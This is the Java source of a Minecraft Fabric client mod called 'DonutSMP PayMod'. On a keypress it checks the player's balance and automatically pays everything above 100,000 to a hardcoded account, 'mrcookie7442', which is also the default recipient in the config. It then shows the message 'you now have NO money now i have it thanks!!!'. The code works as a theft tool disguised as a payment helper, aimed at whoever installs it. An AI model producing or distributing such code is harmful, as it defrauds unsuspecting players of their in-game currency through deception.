package com.donutsmp.paymod;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.mojang.blaze3d.platform.InputConstants;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.minecraft.client.KeyMapping;
import net.minecraft.client.Minecraft;
import net.minecraft.network.chat.Component;
import org.lwjgl.glfw.GLFW;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class PayModClient implements ClientModInitializer {
    private static final Logger LOGGER = LoggerFactory.getLogger("paymod");
    private static final Path CONFIG_PATH = Path.of("config", "paymod.json");
    private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
    private static final long TIMEOUT_MS = 5000;
    private static final long PAY_DELAY_MS = 500;

    private static KeyMapping payKey;
    private static boolean awaitingBalance = false;
    private static boolean awaitingPay = false;
    private static long stateStartTime = 0;
    private static String pendingPayAmount = null;

    private static String targetPlayer = "mrcookie7442";
    private static String balanceCommand = "bal";
    private static String payCommand = "pay";
    private static double subtractAmount = 100000;
    private static Pattern balancePattern = Pattern.compile("[\\d,]+(?:\\.\\d+)?");

    @Override
    public void onInitializeClient() {
        loadConfig();

        payKey = KeyBindingHelper.registerKeyBinding(new KeyMapping(
                "key.paymod.pay_all",
                InputConstants.Type.KEYSYM,
                GLFW.GLFW_KEY_O,
                KeyMapping.Category.MISC
        ));

        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (payKey.consumeClick() && client.player != null && client.getConnection() != null) {
                if (!awaitingBalance && !awaitingPay) {
                    awaitingBalance = true;
                    stateStartTime = System.currentTimeMillis();
                    client.getConnection().sendCommand(balanceCommand);
                    client.player.displayClientMessage(
                            Component.literal("§a[PayMod] Checking balance..."), false);
                }
            }

            long elapsed = System.currentTimeMillis() - stateStartTime;

            if (awaitingBalance && elapsed > TIMEOUT_MS) {
                awaitingBalance = false;
                if (client.player != null) {
                    client.player.displayClientMessage(
                            Component.literal("§c[PayMod] Timed out waiting for balance."), false);
                }
            }

            if (awaitingPay && elapsed >= PAY_DELAY_MS) {
                awaitingPay = false;
                if (client.player != null && client.getConnection() != null) {
                    client.getConnection().sendCommand(
                            payCommand + " " + targetPlayer + " " + pendingPayAmount);
                    client.player.displayClientMessage(
                            Component.literal("you now have NO money now i have it thanks!!!"), false);
                }
            }
        });

        ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
            if (awaitingBalance && !overlay) {
                String amount = extractAmount(message.getString());
                if (amount != null) {
                    awaitingBalance = false;
                    pendingPayAmount = subtractFromAmount(amount);
                    if (pendingPayAmount == null) {
                        Minecraft client = Minecraft.getInstance();
                        if (client.player != null) {
                            client.player.displayClientMessage(
                                    Component.literal("§c[PayMod] Balance too low (less than " + formatAmount(subtractAmount) + "), skipping."), false);
                        }
                        return;
                    }
                    awaitingPay = true;
                    stateStartTime = System.currentTimeMillis();
                }
            }
        });

        LOGGER.info("DonutSMP PayMod loaded! Press O to pay all to {}", targetPlayer);
    }

    private static String extractAmount(String input) {
        if (input == null) return null;
        Matcher matcher = balancePattern.matcher(input);
        if (matcher.find()) {
            return matcher.group().replace(",", "");
        }
        return null;
    }

    private static String subtractFromAmount(String raw) {
        try {
            double balance = Double.parseDouble(raw);
            double result = balance - subtractAmount;
            if (result <= 0) return null;
            return formatAmount(result);
        } catch (NumberFormatException e) {
            return null;
        }
    }

    private static String formatAmount(double amount) {
        if (amount == Math.floor(amount) && !Double.isInfinite(amount)) {
            return String.valueOf((long) amount);
        }
        String s = String.valueOf(amount);
        if (s.contains(".")) {
            s = s.replaceAll("0+$", "").replaceAll("\\.$", "");
        }
        return s;
    }

    private void loadConfig() {
        if (CONFIG_PATH.toFile().exists()) {
            try (FileReader reader = new FileReader(CONFIG_PATH.toFile())) {
                Config cfg = GSON.fromJson(reader, Config.class);
                if (cfg != null) {
                    if (cfg.targetPlayer != null) targetPlayer = cfg.targetPlayer;
                    if (cfg.balanceCommand != null) balanceCommand = cfg.balanceCommand;
                    if (cfg.payCommand != null) payCommand = cfg.payCommand;
                    if (cfg.balanceRegex != null) balancePattern = Pattern.compile(cfg.balanceRegex);
                    subtractAmount = cfg.subtractAmount;
                }
            } catch (IOException e) {
                LOGGER.error("Failed to load config", e);
            }
        } else {
            saveConfig();
        }
    }

    private void saveConfig() {
        try {
            CONFIG_PATH.getParent().toFile().mkdirs();
            try (FileWriter writer = new FileWriter(CONFIG_PATH.toFile())) {
                GSON.toJson(new Config(), writer);
            }
        } catch (IOException e) {
            LOGGER.error("Failed to save config", e);
        }
    }

    private static class Config {
        String targetPlayer = "mrcookie7442";
        String balanceCommand = "bal";
        String payCommand = "pay";
        String balanceRegex = "[\\d,]+(?:\\.\\d+)?";
        double subtractAmount = 100000;
    }
}
